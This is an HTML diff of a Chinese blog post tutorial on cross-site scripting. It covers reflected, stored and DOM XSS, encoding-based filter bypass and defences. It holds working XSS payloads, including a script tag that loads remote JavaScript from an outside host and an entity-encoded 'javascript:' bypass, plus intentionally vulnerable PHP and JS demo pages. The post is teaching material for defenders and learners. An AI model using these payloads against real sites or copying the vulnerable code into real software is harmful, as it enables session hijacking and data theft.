@@ -1,0 +1,955 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="XSS,Web渗透,编码,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言此篇文章是做了一个的基础的XSS漏洞讲解，在小象直播进行的公开课演讲，内容比较简单，感兴趣的可以试听，谢谢。 回放地址扫描下面二维码：  XSS简介XSS被称为跨站脚本攻击（Cross-Site Scripting，由于和CSS（层叠样式表Cascading Style Sheets）重名，故简称为XSS。从OWASP组织公布的TOP10漏洞中，我们也能发现，XSS一直是名列靠前的漏洞之一。">
+<meta name="keywords" content="XSS,Web渗透,编码">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS那些事儿">
+<meta property="og:url" content="http://yoursite.com/2018/04/08/XSS那些事er/index.html">
+<meta property="og:site_name" content="Cc丶MySunshine">
+<meta property="og:description" content="前言此篇文章是做了一个的基础的XSS漏洞讲解，在小象直播进行的公开课演讲，内容比较简单，感兴趣的可以试听，谢谢。 回放地址扫描下面二维码：  XSS简介XSS被称为跨站脚本攻击（Cross-Site Scripting，由于和CSS（层叠样式表Cascading Style Sheets）重名，故简称为XSS。从OWASP组织公布的TOP10漏洞中，我们也能发现，XSS一直是名列靠前的漏洞之一。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.imgur.com/yAtIJjq.png">
+<meta property="og:image" content="https://i.imgur.com/SqVTHuo.png">
+<meta property="og:image" content="https://i.imgur.com/oD8tfJu.png">
+<meta property="og:image" content="https://i.imgur.com/XNfwkGr.png">
+<meta property="og:image" content="https://i.imgur.com/ACURObG.png">
+<meta property="og:image" content="https://i.imgur.com/5I3pX7H.png">
+<meta property="og:image" content="https://i.imgur.com/rxq330f.png">
+<meta property="og:image" content="https://i.imgur.com/PGygrys.png">
+<meta property="og:image" content="https://i.imgur.com/x6tc6j7.png">
+<meta property="og:image" content="https://i.imgur.com/x6tc6j7.png">
+<meta property="og:image" content="https://i.imgur.com/TGxzi4x.png">
+<meta property="og:image" content="https://i.imgur.com/IOB8atM.png">
+<meta property="og:image" content="https://i.imgur.com/IOB8atM.png">
+<meta property="og:image" content="https://i.imgur.com/5woWTXz.png">
+<meta property="og:image" content="https://i.imgur.com/Z43PNXg.png">
+<meta property="og:image" content="https://i.imgur.com/oH7EA9j.png">
+<meta property="og:image" content="https://i.imgur.com/Q25dZyL.png">
+<meta property="og:image" content="https://i.imgur.com/9wAjDOv.png">
+<meta property="og:updated_time" content="2018-05-03T09:24:58.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XSS那些事儿">
+<meta name="twitter:description" content="前言此篇文章是做了一个的基础的XSS漏洞讲解，在小象直播进行的公开课演讲，内容比较简单，感兴趣的可以试听，谢谢。 回放地址扫描下面二维码：  XSS简介XSS被称为跨站脚本攻击（Cross-Site Scripting，由于和CSS（层叠样式表Cascading Style Sheets）重名，故简称为XSS。从OWASP组织公布的TOP10漏洞中，我们也能发现，XSS一直是名列靠前的漏洞之一。">
+<meta name="twitter:image" content="https://i.imgur.com/yAtIJjq.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/04/08/XSS那些事er/">
+
+
+
+
+
+  <title>XSS那些事儿 | Cc丶MySunshine</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Cc丶MySunshine</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于我
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/08/XSS那些事er/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Cc丶MySunshine">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cc丶MySunshine">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">XSS那些事儿</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-08T14:38:40+08:00">
+                2018-04-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">Web渗透</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>此篇文章是做了一个的基础的XSS漏洞讲解，在小象直播进行的公开课演讲，内容比较简单，感兴趣的可以试听，谢谢。</p>
+<p>回放地址扫描下面二维码：</p>
+<p><img src="https://i.imgur.com/yAtIJjq.png" alt></p>
+<h1 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h1><p>XSS被称为跨站脚本攻击（Cross-Site Scripting，由于和CSS（层叠样式表Cascading Style Sheets）重名，故简称为XSS。<br>从OWASP组织公布的TOP10漏洞中，我们也能发现，XSS一直是名列靠前的漏洞之一。</p>
+<p><img src="https://i.imgur.com/SqVTHuo.png" alt></p>
+<p>XSS最大的特点就是能注入恶意的HTML/JavaScript代码到用户的网页上，从而达到劫持用户会话的目的。不严格地讲，XSS也是注入的一种，HTML注入。由于HTML代码和客户端JavaScript脚本能在受害者主机上的浏览器任意执行，这样等同于完全控制了Web客户端的逻辑，在这个基础上，黑客或者攻击者可以轻易地发动各种各样的攻击。</p>
+<p>在讲XSS之前，我们先说一下浏览器的同源策略。</p>
+<p>所谓同源策略，是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能可能都会受到影响。可以说Web是构建在同源策略基础之上的，浏览器只是针对同源策略的一种实现。<br>如果两个页面的协议，端口（如果有指定）和域名都相同，则两个页面具有相同的源。</p>
+<p><img src="https://i.imgur.com/oD8tfJu.png" alt></p>
+<p>同domain,同端口，同协议视为同一个域，一个域内的脚本仅仅具有本域内的权限，可以理解为本域脚本只能读写本域内的资源，而无法访问其它域的资源。但有些时候我们看到img，script，style等标签，都允许跨域引用资源，严格说这是不符合同源要求的。然而，其实只是引用这些资源而已，并不能读取这些资源的内容。</p>
+<p>说了这么多，到底XSS是什么样子呢？先看一下，我们输入一个恶意Payload,来执行输入的HTML标签。</p>
+<p><img src="https://i.imgur.com/XNfwkGr.png" alt></p>
+<p>这里便是一个可控的输入点，我们输入&lt;img src=x onerror=alert(/XSS/)&gt;,发现成功弹窗了。</p>
+<p><img src="https://i.imgur.com/ACURObG.png" alt></p>
+<h1 id="XSS漏洞的危害"><a href="#XSS漏洞的危害" class="headerlink" title="XSS漏洞的危害"></a>XSS漏洞的危害</h1><p>那么XSS到底有哪些危害呢，一起来看</p>
+<ul>
+<li>1    网络钓鱼，包括盗取各类用户账号</li>
+<li>2 窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作</li>
+<li>3 劫持用户（浏览器）会话，从而执行任意操作，例如进行非法转账、强制发表日志、发送电子邮件等</li>
+<li>4 强制弹出广告页面、刷流量等</li>
+<li>5 网页挂马</li>
+<li>6 传播跨站脚本蠕虫等</li>
+<li>7 结合其他漏洞，如CSRF漏洞，实施进一步作恶</li>
+<li>8 其他各种恶意操作等</li>
+</ul>
+<p>以往，XSS跨站脚本一直被当做是一类鸡肋漏洞没有什么好利用的地方，只能弹出对话框而已，稍微有点危害的就是用来盗取用户Cookies资料和网页挂马。另外通常情况下，我们通过注入alert(/XSS/)之类的JavaScript代码，实际上并没有反映其危害性，只是证明其存在性。</p>
+<p>相较而言，乙方对于XSS确实没有引起足够高的重视。诚然，XSS不如SQL注入、文件上传等直接获取较高权限，甚至getshell；但是它的运用方式相当灵活，构造的恶意代码也多式多样，只要开拓思维，适当结合其他技术一起运用，XSS的危害还是很大的。</p>
+<h1 id="XSS漏洞的类型"><a href="#XSS漏洞的类型" class="headerlink" title="XSS漏洞的类型"></a>XSS漏洞的类型</h1><p>那么XSS到底有哪几种类型呢</p>
+<p>可以分为两种类型：</p>
+<ul>
+<li>非持久性攻击</li>
+<li>持久性攻击</li>
+</ul>
+<p>非持久型XSS攻击：顾名思义，非持久型XSS攻击是一次性的，仅对当次的页面访问产生影响。非持久型XSS攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。</p>
+<p>持久型XSS攻击：持久型XSS，会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。</p>
+<p>当然我们也可以划分为如下三种类型：</p>
+<ul>
+<li>反射型XSS,经过后端，不经过数据库</li>
+<li>存储型XSS,经过后端，经过数据库</li>
+<li>DOM型XSS,不经过后端，基于文档对象模型(DOM),通过传入参数修改DOM结构，从而浏览器解析执行脚本</li>
+</ul>
+<p>这里我们利用DVWA来分别对反射型和存储型XSS进行验证。</p>
+<h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>在输入框输入可执行的JavaScript脚本，这里远程加载JavaScript，测试代码如下:</p>
+<p>&lt;script src= <a href="http://victorsec.top/xss.js&gt;" target="_blank" rel="noopener">http://victorsec.top/xss.js&gt;</a></p>
+<p><img src="https://i.imgur.com/5I3pX7H.png" alt></p>
+<p>反射型XSS,不会持久，构造的Payload也只会执行一次。</p>
+<p>反射型 XSS 的数据流向是：浏览器 -&gt; 后端 -&gt; 浏览器</p>
+<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>存储型XSS,顾名思义就是将恶意代码存储到数据库中，只要访问页面，恶意代码即可执行。由此可以看出，存储型XSS的危害就比反射型XSS大很多。我们依然利用DVWA的存储XSS漏洞，输入测试代码如下：</p>
+<p><img src="https://i.imgur.com/rxq330f.png" alt></p>
+<p>点击执行，会将Payload存储到数据库中，每次刷新页面都会执行恶意脚本。</p>
+<p><img src="https://i.imgur.com/PGygrys.png" alt></p>
+<p>我们可以看出，存储行 XSS 的数据流向是：<br>浏览器 -&gt; 后端 -&gt; 数据库 -&gt; 后端 -&gt; 浏览器。</p>
+<h2 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h2><p>DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。</p>
+<p>可以触发DOM XSS的属性有：</p>
+<ul>
+<li>document.referer属性</li>
+<li>window.name属性</li>
+<li>location属性</li>
+<li>innerHTML属性</li>
+<li>documen.write属性等</li>
+</ul>
+<p>这里我们以document.write和innerHTML为例，在本地搭建DOM XSS演示</p>
+<h3 id="代码一"><a href="#代码一" class="headerlink" title="代码一"></a>代码一</h3><pre><code><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">         var s=location.search;          //返回URL中的查询部分（？之后的内容）</span></span><br><span class="line"><span class="undefined">           s=s.substring(1,s.length);    //返回整个查询内容</span></span><br><span class="line"><span class="undefined">         var url="";                     //定义变量url</span></span><br><span class="line"><span class="undefined">         if(s.indexOf("url=")&gt;-1)&#123;       //判断URL是否为空</span></span><br><span class="line"><span class="undefined">           var pos=s.indexOf("url=")+4;  //过滤掉"url="字符</span></span><br><span class="line"><span class="undefined">           url=s.substring(pos,s.length); //得到地址栏里的url参数</span></span><br><span class="line"><span class="undefined">         &#125;else&#123;</span></span><br><span class="line"><span class="undefined">           url="url参数为空";</span></span><br><span class="line"><span class="undefined">         &#125;</span></span><br><span class="line"><span class="undefined">     </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'test'</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined">document.getElementById("test").innerHTML="我的url是: "+url; </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</code></pre><p>完整URL如下：<br><a href="http://127.0.0.1/xsstest2.html?url=&lt;img" target="_blank" rel="noopener">http://127.0.0.1/xsstest2.html?url=&lt;img</a> src=x onerror=alert(666)&gt;</p>
+<p>通过浏览器传入参数url，向DOM中div内写入值，从而触发DOM XSS</p>
+<p><img src="https://i.imgur.com/x6tc6j7.png" alt></p>
+<h3 id="代码二"><a href="#代码二" class="headerlink" title="代码二"></a>代码二</h3><pre><code><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">       var s=location.search;          //返回URL中的查询部分（？之后的内容）</span></span><br><span class="line"><span class="undefined">         s=s.substring(1,s.length);    //返回整个查询内容</span></span><br><span class="line"><span class="undefined">       var url="";                     //定义变量url</span></span><br><span class="line"><span class="undefined">       if(s.indexOf("url=")&gt;-1)&#123;       //判断URL是否为空 </span></span><br><span class="line"><span class="undefined">         var pos=s.indexOf("url=")+4;  //过滤掉"url="字符</span></span><br><span class="line"><span class="undefined">         url=s.substring(pos,s.length); //得到地址栏里的url参数</span></span><br><span class="line"><span class="undefined">       &#125;else&#123;</span></span><br><span class="line"><span class="undefined">         url="url参数为空";</span></span><br><span class="line"><span class="undefined">       &#125;</span></span><br><span class="line"><span class="xml">       document.write("url: <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'"+url+"'</span>&gt;</span>"+url+"<span class="tag">&lt;/<span class="name">a</span>&gt;</span>");  //输出</span></span><br><span class="line"><span class="undefined">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</code></pre><p>通过浏览器url传入参数的值，从而写入DOM中，Javascript执行恶意代码，从而产生DOM XSS</p>
+<p>完整URL如下：</p>
+<p><a href="http://127.0.0.1/xsstest3.html?url=&lt;img" target="_blank" rel="noopener">http://127.0.0.1/xsstest3.html?url=&lt;img</a> src=x onerror=alert(666)&gt;</p>
+<p><img src="https://i.imgur.com/x6tc6j7.png" alt></p>
+<p>DOM XSS并没有经过服务端和数据库，只在浏览器前端，通过DOM的操作执行恶意脚本。因此DOM XSS的数据流如下：DOM XSS数据流：URL -&gt; 浏览器</p>
+<p>一般来说，反射型XSS经常会出现在登录框、搜索框等输入位置。</p>
+<p>而存储型XSS多发生在留言板、评论、博客日志用户交互的位置。</p>
+<p>DOM XSS多与document.write、innerHTML相关。</p>
+<h1 id="XSS的防御"><a href="#XSS的防御" class="headerlink" title="XSS的防御"></a>XSS的防御</h1><p>XSS产生的原因呢？是由于输入数据的不可控，未对数据进行过滤。<br>那么我们防御XSS要从以下几个方面着手：</p>
+<ul>
+<li>输入校验：长度限制、值类型是否正确、是否包含特殊字符（&lt;&gt;”等）、是否包含alert、onclick、script等关键字。</li>
+<li>输出编码：根据输出的位置进行相应的编码，如HTML编码、JavaScript编码、URL编码。原则是该数据不要超出自己所在的区域，也不要被当做指令执行。</li>
+<li>考虑set-cookie中设置http-only,避免cookie盗用。</li>
+</ul>
+<p>另外对于DOM XSS的防御，避免客户端文档的重写、重定向或其他敏感操作，同时避免使用客户端数据，这些操作尽量在服务端使用动态页面来实现。</p>
+<p>对于防御来说，现在使用的很多框架，都加入了规则，过滤转码，禁止使用document.write、innerHTML等这类函数。但也并不是说一定安全，没有绝对的安全，所谓道高一尺，魔高一丈，漏洞挖掘本身就是模糊测试，需要我们不断研究攻击与防御原理，才能不断更新规则，提高web安全。</p>
+<p>很多时候漏洞需要一定的配合方能进行攻击利用，比如现在挖掘到一个self-XSS，只能用来打自己的Cookie等，此时我们可以考虑是否能CSRF（跨站请求伪造），通过将CSRF和self-XSS进行配合利用，便可以实现XSS的威力。再比如当遇到Cookie设置了http-only是否真的无法利用？之前有见过将CORS跨域资源访问配合进行利用，有防御就有攻击，有攻击就会防御，攻防是加强安全的手段。</p>
+<h1 id="XSS的编码问题"><a href="#XSS的编码问题" class="headerlink" title="XSS的编码问题"></a>XSS的编码问题</h1><p>既然说到编码，先说一下浏览器常用的几种编码吧</p>
+<p>URL编码：一个百分号和该字符的ASCII编码所对应的2位十六进制数字，例如“/”的URL编码为%2F(一般大写，但不强求)</p>
+<p>HTML编码：在呈现HTML页面时,有时候需要显示一些特殊的字符,例如”&lt;”和”&amp;”,因为它们是HTML专用字符，需要通过一定的方式来实现，HTML编码由此诞生。HTML编码只是一种函数体现，用于将字符转换成HTML实体。</p>
+<p>JavaScript编码：可以采用跟HtmlEncode不同的编码方式，即使用“\”对特殊字符进行转义。也可以转换成对应的字符编码。</p>
+<p>js提供了四种字符编码的策略：</p>
+<ul>
+<li>三个八进制数字，如果不够个数，前面补0，例如“e”编码为“\145” 　　</li>
+<li>两个十六进制数字，如果不够个数，前面补0，例如“e”编码为“\x65” 　　</li>
+<li>四个十六进制数字，如果不够个数，前面补0，例如“e”编码为“\u0065” 　</li>
+<li>对于一些控制字符，使用特殊的C类型的转义风格（例如\n和\r）</li>
+</ul>
+<p>浏览器解析原理：</p>
+<p>浏览器在接收到一个HTML文件时，会从头开始对文档进行解析。遇到javascript时，会调用javascript解析器进行解析。遇到类似Onclick等需要触发才会执行的代码会跳过，事件被触发时才会被解析。</p>
+<h2 id="案例一：HTML——JS"><a href="#案例一：HTML——JS" class="headerlink" title="案例一：HTML——JS"></a>案例一：HTML——JS</h2><pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmlencode</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($str)) <span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">if</span>($str == <span class="string">""</span>) <span class="keyword">return</span>;</span><br><span class="line">	$str = str_ireplace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">	$str = str_ireplace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">	$str = str_ireplace(<span class="string">"script"</span>,<span class="string">""</span>,$str);</span><br><span class="line">  		$str = str_ireplace(<span class="string">"img"</span>,<span class="string">""</span>,$str);</span><br><span class="line">  		$str = str_ireplace(<span class="string">":"</span>,<span class="string">""</span>,$str);</span><br><span class="line">  		$str = str_ireplace(<span class="string">"javascript"</span>,<span class="string">""</span>,$str);</span><br><span class="line">	</span><br><span class="line">  		<span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!array_key_exists (<span class="string">"name"</span>,$_GET) || $_GET[<span class="string">'name'</span>] == <span class="keyword">NULL</span> || $_GET[<span class="string">'name'</span>] == <span class="string">''</span>)&#123;</span><br><span class="line">$isempty = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            </span><br><span class="line"> $html = <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line"> $html .= <span class="string">'&lt;a onclick=" '</span> .htmlencode($_GET[<span class="string">'name'</span>]).<span class="string">'"&gt;click this url&lt;/a&gt;'</span>;</span><br><span class="line"> $html .= <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> @$html;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</code></pre><p>这里我们先看name所在的环境，通过url传入参数，然后在html标签里，先进行html解码，然后进行js解码，于是我们考虑对输入的url参数进行html编码，从而可以在进行js解码之前还原参数，从而js执行恶意代码</p>
+<p>这里搭建环境只是测试不同环境下的xss解码顺序，由于html编码包含&amp;和#，我们需要先对url参数进行url编码<br>，然后url参数在服务端解码，然后绕过对javascript等字符的过滤，然后在浏览器解析时造成解码差执行</p>
+<p>%26%23x6A%3b%26%23x61%3b%26%23x76%3b%26%23x61%3b%26%23x73%3b%26%23x63%3b%26%23x72%3b%26%23x69%3b%26%23x70%3b%26%23x74%3b%26%23x3A%3b%26%23x61%3b%26%23x6C%3b%26%23x65%3b%26%23x72%3b%26%23x74%3b%26%23x28%3b%26%23x31%3b%26%23x29%3b</p>
+<p>然后查看源代码可以看到：</p>
+<p><img src="https://i.imgur.com/TGxzi4x.png" alt></p>
+<p>onclick事件需要点击才会执行，先html解码，然后js解码，从而执行弹窗</p>
+<p><img src="https://i.imgur.com/IOB8atM.png" alt></p>
+<h2 id="案例二：JS——HTML"><a href="#案例二：JS——HTML" class="headerlink" title="案例二：JS——HTML"></a>案例二：JS——HTML</h2><pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!array_key_exists (<span class="string">"name"</span>,$_GET) || $_GET[<span class="string">'name'</span>] == <span class="keyword">NULL</span> || $_GET[<span 